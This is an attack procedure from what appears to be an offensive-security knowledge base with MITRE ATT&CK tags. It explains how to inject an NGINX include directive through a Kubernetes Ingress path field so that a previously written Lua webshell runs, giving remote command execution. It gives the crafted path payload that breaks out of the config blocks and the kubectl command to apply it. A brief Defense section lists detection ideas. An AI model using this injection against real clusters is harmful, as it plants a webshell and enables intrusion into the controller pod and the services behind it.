---
id: proc-005
tags:
  - webshell
  - include
  - rce
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/kubectl-apply-webshell-ingress-yaml]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:49.925Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Create-Webshell-Ingress-for-RCE

## Summary

This procedure updates the Ingress resource to include the /tmp/luashell file in the NGINX location block via an include directive, activating the Lua webshell for RCE.

## Description

Building on the file write, the path field now injects: location /z/ { include /tmp/luashell; }. This causes NGINX to process the Lua code during requests to /z/, enabling execution. The injection closes prior blocks and adds the server/location config.

## Requirements

1. Lua file written to /tmp/luashell from previous procedure.
2. Permissions to update Ingress.
3. webshell_ingress.yaml prepared.
4. Controller pod running.

## Defense

Defensive measures and detection strategies:

- Block include directives in Ingress processing.
- Scan for /tmp file includes in NGINX configs.
- Rotate pod filesystems or use ephemeral storage.
- Audit Ingress updates for path anomalies.

## Objectives

1. Include Lua file in NGINX config.
2. Activate webshell on /z/ requests.
3. Enable arbitrary command execution.
4. Confirm RCE without pod exec.

## Instructions

### Step 1: Prepare Webshell YAML

**Context**: Craft webshell_ingress.yaml with path: '/x/ {\n}\n}\n log_format exploit escape=none $http_x_ginoah;\n server {\n server_name x.x;\n listen 80;\n listen [::]:80;\n location /z/ {\n include /tmp/luashell;\n}\n location /x/ {\n pathType: Exact backend: service: name: not-exist-service port: number:8080'.

Manually create YAML similar to write_ingress but with include.

### Step 2: Apply the Webshell Ingress

**Context**: Deploy to reload NGINX config with the include.

**Command** ([[commands/kubectl-apply-webshell-ingress-yaml]]):

```bash
kubectl apply -f webshell_ingress.yaml
```

> Expected output: "ingress.networking.k8s.io/webshell created/updated". NGINX reloads automatically.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/kubectl-apply-webshell-ingress-yaml]]

## Tools Used

- [[tools/kubectl]]

## Tags

- webshell
- include
- rce
